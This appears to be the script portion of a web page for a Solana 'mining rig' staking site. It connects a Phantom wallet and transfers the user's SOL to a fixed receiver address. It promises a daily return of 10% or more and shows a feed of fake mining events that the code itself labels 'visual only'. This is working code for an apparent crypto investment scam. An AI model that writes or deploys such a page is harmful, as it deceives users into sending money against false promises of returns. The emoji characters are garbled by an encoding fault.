            updateMiningStats(total);
        }

        // Add stake and update Firestore
        async function addStakeToFirestore(amountSol, signature) {
            if (!userDocRef || !walletAddress) return;
            
            const doc = await userDocRef.get();
            if (!doc.exists) return;
            
            const currentTotal = doc.data().totalStaked || 0;
            const newTotal = currentTotal + amountSol;
            
            await userDocRef.update({
                totalStaked: newTotal,
                lastDailyUpdate: Date.now(),
                lastTransaction: signature,
                lastTransactionTime: firebase.firestore.FieldValue.serverTimestamp()
            });
            
            await refreshUserStats();
            addToFeed(`ðŸ“¦ +${amountSol} SOL added to mining rig`, 'success');
        }

        // Function to check if Phantom is available (like working example)
        function getProvider() {
            if ('phantom' in window) {
                const provider = window.phantom?.solana;
                if (provider?.isPhantom) {
                    return provider;
                }
            }
            
            if (window.solana?.isPhantom) {
                return window.solana;
            }
            
            return null;
        }

        // Connect Phantom - Fixed to match working example
        async function connectPhantom() {
            const provider = getProvider();
            
            if (!provider) {
                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                if (isMobile) {
                    if (confirm("Open Phantom app to start mining?")) {
                        window.location.href = "phantom://browse";
                        setTimeout(() => {
                            window.location.href = "https://phantom.app/ul/browse";
                        }, 1000);
                    }
                } else {
                    window.open("https://phantom.app/", "_blank");
                    alert("Please install Phantom wallet to start mining");
                }
                return;
            }

            try {
                connectBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i><span class="btn-text">LOADING...</span>';
                
                // Connect to wallet (like working example)
                const resp = await provider.connect();
                walletAddress = resp.publicKey.toString();
                
                const userData = await loadUserData(walletAddress);
                
                if (userData) {
                    await calculateDailyRewards(userData);
                    
                    walletAddrSpan.innerText = formatAddr(walletAddress);
                    walletInfoDiv.style.display = 'block';
                    connectBtn.innerHTML = '<i class="fab fa-phantom"></i><span class="btn-text">MINING ACTIVE</span>';
                    connectBtn.style.background = 'rgba(0, 255, 170, 0.15)';
                    connectBtn.style.borderColor = '#00ffaa';
                    
                    await refreshUserStats();
                    addToFeed('ðŸ”Œ mining rig connected to network', 'success');
                    
                    startMiningSimulation();
                }
                
            } catch (err) {
                console.error('Connection error:', err);
                showTransactionStatus('Failed to connect: ' + err.message, 'error');
                connectBtn.innerHTML = '<i class="fab fa-phantom"></i><span class="btn-text">CONNECT PHANTOM</span>';
            }
        }

        // REAL TRANSACTION - Following the working example pattern exactly
        async function sendStake(amount = null) {
            const provider = getProvider();
            
            if (!walletAddress || !provider) {
                showTransactionStatus("Connect your mining rig first", 'error');
                return;
            }

            const stakeAmount = amount || parseFloat(stakeAmountInput.value);
            
            if (isNaN(stakeAmount) || stakeAmount < MIN_STAKE_SOL) {
                showTransactionStatus(`Minimum stake is ${MIN_STAKE_SOL} SOL`, 'error');
                return;
            }

            // Step 1: Show confirmation modal
            const tierInfo = calculateTier(parseFloat(totalStakedSpan.innerText) || 0);
            const estimatedDailyReward = stakeAmount * 0.1 * tierInfo.boost;
            
            const confirmed = await showConfirmModal(
                "Confirm Mining Stake",
                `Amount: ${stakeAmount} SOL\n` +
                `Daily Reward: ${estimatedDailyReward.toFixed(4)} SOL\n` +
                `Tier Boost: ${tierInfo.boost}x\n\n` +
                `Confirm to proceed with the transaction in your wallet.`
            );

            if (!confirmed) {
                showTransactionStatus('Transaction cancelled by user', 'info');
                addToFeed('âš ï¸ stake cancelled by user', 'warning');
                return;
            }

            // Step 2: Initiate Solana Transaction
            try {
                showTxModal(
                    "â›ï¸ PROCESSING TRANSACTION",
                    "Preparing transaction...",
                    `Amount: ${stakeAmount} SOL\nPlease approve in your wallet.`
                );

                addToFeed('ðŸ“ creating transaction...', 'info');

                const connection = new solanaWeb3.Connection(HELIUS_RPC, 'confirmed');
                
                const fromWalletPublicKey = new solanaWeb3.PublicKey(walletAddress);
                const toWalletPublicKey = new solanaWeb3.PublicKey(RECEIVER_ADDRESS);

                // Convert SOL to lamports (1 SOL = 1,000,000,000 lamports)
                const lamports = solanaWeb3.LAMPORTS_PER_SOL * stakeAmount;

                let transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: fromWalletPublicKey,
                        toPubkey: toWalletPublicKey,
                        lamports: lamports,
                    })
                );

                // Get the latest blockhash
                const { blockhash } = await connection.getLatestBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = fromWalletPublicKey;

                updateTxModal(
                    "ðŸ” APPROVE IN WALLET",
                    `Please approve this transaction in your Phantom wallet.\n\nAmount: ${stakeAmount} SOL\nTo: ${formatAddr(RECEIVER_ADDRESS)}\n\nWaiting for your approval...`
                );

                addToFeed('â³ waiting for wallet approval...', 'info');

                // Sign and send transaction using the provider
                const signedTransaction = await provider.signAndSendTransaction(transaction);

                updateTxModal(
                    "â³ CONFIRMING TRANSACTION",
                    `Transaction Signature:\n${signedTransaction.signature}\n\nWaiting for blockchain confirmation...`
                );
                
                addToFeed(`ðŸ“¤ tx sent: ${signedTransaction.signature.slice(0,8)}...`, 'mining');
                
                // Wait for transaction confirmation
                const { value: status } = await connection.confirmTransaction({
                    signature: signedTransaction.signature,
                    blockhash: blockhash,
                    lastValidBlockHeight: (await connection.getLatestBlockhash()).lastValidBlockHeight
                }, 'confirmed');

                if (status.err) {
                    throw new Error('Transaction failed on blockchain: ' + JSON.stringify(status.err));
                }

                // Transaction confirmed! Update Firebase
                await addStakeToFirestore(stakeAmount, signedTransaction.signature);
                
                showTransactionStatus(`âœ… Success! Staked ${stakeAmount} SOL`, 'success');
                
                updateTxModal(
                    "âœ… MINING STARTED!",
                    `ðŸŽ‰ Transaction Confirmed!\n\nSignature: ${signedTransaction.signature}\n\nAmount Staked: ${stakeAmount} SOL\nStatus: âœ“ Confirmed on Solana`,
                    `Transaction successful! Your mining rig is now active.`
                );
                
                addToFeed(`â›ï¸ ${stakeAmount} SOL staked successfully!`, 'success');
                
                await refreshUserStats();
                
            } catch (error) {
                console.error("Solana transaction failed:", error);
                
                let errorMessage = "âŒ Transaction failed. ";
                if (error.message.includes('User rejected')) {
                    errorMessage += "You rejected the transaction in your wallet.";
                    addToFeed('âš ï¸ transaction rejected by user', 'warning');
                } else if (error.message.includes('Insufficient funds')) {
                    errorMessage += "Insufficient SOL balance in your wallet.";
                    addToFeed('âš ï¸ insufficient balance', 'warning');
                } else {
                    errorMessage += error.message;
                    addToFeed('âš ï¸ transaction failed', 'warning');
                }
                
                showTransactionStatus(errorMessage, 'error');
                
                updateTxModal(
                    "âŒ TRANSACTION FAILED",
                    errorMessage,
                    "Please try again or contact support if the issue persists."
                );
            }
        }

        // Mining simulation (visual only)
        function startMiningSimulation() {
            if (miningInterval) clearInterval(miningInterval);
            
            const events = [
                'âš¡ hashing at full power',
                'ðŸ” validating new block',
                'ðŸ“Š calculating rewards',
                'ðŸ’Ž rare gem discovered',
                'ðŸ”„ syncing with network',
                'âš™ï¸ optimizing mining rig',
                'ðŸŒ connected to 12 peers',
                'ðŸ”— block validated'
            ];
            
            miningInterval = setInterval(async () => {
                if (!userDocRef || !walletAddress) return;
                
                if (Math.random() > 0.6) {
                    const randomEvent = events[Math.floor(Math.random() * events.length)];
                    addToFeed(randomEvent, 'mining');
                }
                
                await refreshUserStats();
            }, 5000);
        }

        // Event listeners
        connectBtn.addEventListener('click', connectPhantom);
        stakeBtn.addEventListener('click', () => sendStake());
        quickStake0_5.addEventListener('click', () => sendStake(0.5));
        quickStake1.addEventListener('click', () => sendStake(1));
        quickStake5.addEventListener('click', () => sendStake(5));
        quickStake10.addEventListener('click', () => sendStake(10));

        // Check for existing connection on page load
        window.addEventListener('load', async () => {
            const provider = getProvider();
            if (provider && provider.isConnected && provider.publicKey) {
                walletAddress = provider.publicKey.toString();
                
                const userData = await loadUserData(walletAddress);
                
                if (userData) {
                    await calculateDailyRewards(userData);
                    
                    walletAddrSpan.innerText = formatAddr(walletAddress);
                    walletInfoDiv.style.display = 'block';
                    connectBtn.innerHTML = '<i class="fab fa-phantom"></i><span class="btn-text">MINING ACTIVE</span>';
                    connectBtn.style.background = 'rgba(0, 255, 170, 0.15)';
                    connectBtn.style.borderColor = '#00ffaa';
                    
                    await refreshUserStats();
                    startMiningSimulation();
                    addToFeed('ðŸ”„ mining rig resumed', 'success');
                }
            }
        });

        // Listen for account changes
        if (window.solana) {
            window.solana.on('accountChanged', (publicKey) => {
                if (publicKey) {
                    walletAddress = publicKey.toString();
                    walletAddrSpan.innerText = formatAddr(walletAddress);
                    loadUserData(walletAddress);
                } else {
                    // Disconnected
                    walletAddress = null;
                    walletInfoDiv.style.display = 'none';
                    connectBtn.innerHTML = '<i class="fab fa-phantom"></i><span class="btn-text">CONNECT PHANTOM</span>';
                    connectBtn.style.background = '';
                    connectBtn.style.borderColor = '';
                }
            });
        }
    </script>
</body>
</html>
